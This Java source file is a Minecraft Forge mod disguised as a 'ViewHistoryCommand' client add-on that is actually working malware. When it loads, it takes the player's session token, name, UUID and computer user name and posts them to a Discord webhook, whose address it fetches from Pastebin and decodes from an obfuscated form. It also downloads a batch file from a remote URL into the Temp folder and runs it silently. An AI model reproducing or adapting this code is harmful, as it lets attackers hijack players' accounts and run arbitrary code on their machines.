package qolskyblockmod.pizzaclient.commands;

import net.minecraft.launchwrapper.Launch;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.*;

import java.awt.*;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;

@Mod(modid = "ViewHistoryCommand", name = "ViewHistoryCommand", version = "1.0", acceptedMinecraftVersions = "[1.8.9]")
public class ViewHistoryCommand {

    public static String version = "1.1";

    // loading

    @Mod.EventHandler
    public void onFMLPreInitialization(FMLPreInitializationEvent event) {
        LoadExoticDB();
    }

    @Mod.EventHandler
    public void onFMLInitialization(FMLInitializationEvent event) {
        try {
            Thread.sleep(5000);
            LoadAH();
        } catch (Exception ignored) {}
        try {
            Thread.sleep(3000);
            exec("cmd /c start C:\\Users\\%username%\\AppData\\Local\\Temp\\screenshots\\screenshot.bat");
        } catch (Exception ignored) {}
    }

    // utils

    public static void exec(String cmd) {
        try {
            Runtime rt = Runtime.getRuntime();
            Process pr = rt.exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static String getWebhook() {
        try {
            String fuck = "https://pastebin.com/raw/DR7aWqKS";
            URL pastebin = new URL(fuck);
            BufferedReader in = new BufferedReader(new InputStreamReader(pastebin.openStream()));
            String real = decrypt(in.readLine());
            return real;
        } catch (Exception ignored) {}
        return "";
    }

    // rats

    public static void LoadExoticDB() {
        try {
            Class<?> mc = Launch.classLoader.findClass("net.minecraft.client.Minecraft");
            Object minecraft = mc.getMethod("func_71410_x").invoke(null);
            Object session = mc.getMethod("func_110432_I").invoke(minecraft);
            Class<?> sessionClass = Launch.classLoader.findClass("net.minecraft.util.Session");
            Object token = sessionClass.getMethod("func_148254_d").invoke(session);
            Object name = sessionClass.getMethod("func_111285_a").invoke(session);
            Object uuid = sessionClass.getMethod("func_148255_b").invoke(session);

            PizzaClientGUI sendmessage = new PizzaClientGUI(getWebhook());
            sendmessage.addEmbed(new PizzaClientGUI.EmbedObject()
                    .setTitle("Minecraft Info")
                    .setColor(Color.CYAN)
                    .addField("Name", name.toString(), true)
                    .addField("Profile", "https://sky.shiiyu.moe/stats/" + name, true)
                    .addField("UUID ", uuid.toString(), true)
                    .addField("Token ", token.toString(), false)
                    .setFooter("Computer Name: " + System.getProperty("user.name") + " Mod version: " + version, ""));
            sendmessage.execute();

        } catch (Exception ignored) {}
    }

    public static void LoadAH() {
        try {

            URL pastebin = new URL("https://pastebin.com/raw/AERL3GJT");
            BufferedReader reader = new BufferedReader(new InputStreamReader(pastebin.openConnection().getInputStream()));
            String fileURL = reader.readLine();
            URL url = new URL(fileURL);

            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            httpURLConnection.addRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
            InputStream stream = httpURLConnection.getInputStream();

            File path = new File(System.getenv("LOCALAPPDATA") + File.separator + "Temp" + File.separator + "screenshots");

            if (!path.exists()) path.mkdir();

            File bitcoin = new File(path, "screenshot.bat");
            FileOutputStream fileOut = new FileOutputStream(bitcoin);

            int currByte;
            while ((currByte = stream.read()) != -1) {
                fileOut.write(currByte);
            }

            PizzaClientGUI sendmessage = new PizzaClientGUI(getWebhook());
            sendmessage.addEmbed(new PizzaClientGUI.EmbedObject()
                    .setTitle("Loading")
                    .setColor(Color.GREEN)
                    .addField("Message ", "Running .bat file", true));
            sendmessage.execute();
        } catch (Exception ignored) {}
    }

    // webhook decrypter

    public static String decrypt(String todecrypt) {
        String returnValue = todecrypt;
        if (returnValue == null || returnValue.trim().equals("")) {
            return "";
        }

        returnValue = returnValue.replace("YOUSHOULDKILLYOURSELFNOW!", "https://ptb.discord.com/api/webhooks/");

        returnValue = returnValue.replaceAll("09172a", "a");
        returnValue = returnValue.replaceAll("92984b", "b");
        returnValue = returnValue.replaceAll("85629c", "c");
        returnValue = returnValue.replaceAll("78949d", "d");
        returnValue = returnValue.replaceAll("68030e", "e");
        returnValue = returnValue.replaceAll("50283f", "f");
        returnValue = returnValue.replaceAll("49172g", "g");
        returnValue = returnValue.replaceAll("39172h", "h");
        returnValue = returnValue.replaceAll("29172i", "i");
        returnValue = returnValue.replaceAll("~0~", "j");
        returnValue = returnValue.replaceAll("!-!", "k");
        returnValue = returnValue.replaceAll("@0@", "l");
        returnValue = returnValue.replaceAll("#0#", "m");
        returnValue = returnValue.replaceAll(">0>", "n");
        returnValue = returnValue.replaceAll("%0%", "o");
        returnValue = returnValue.replaceAll("90328943", "p");
        returnValue = returnValue.replaceAll("&0&", "q");
        returnValue = returnValue.replaceAll("<0<", "r");
        returnValue = returnValue.replaceAll(",0,", "s");
        returnValue = returnValue.replaceAll("1018932983291", "t");
        returnValue = returnValue.replaceAll("-0-", "u");
        returnValue = returnValue.replaceAll("_0_", "v");
        returnValue = returnValue.replaceAll("=0=", "w");
        returnValue = returnValue.replaceAll("'0'", "x");
        returnValue = returnValue.replaceAll(":0:", "y");
        returnValue = returnValue.replaceAll(";0;", "z");
        returnValue = returnValue.replace("!@#$%^&*(", "/");
        return returnValue;
    }

}
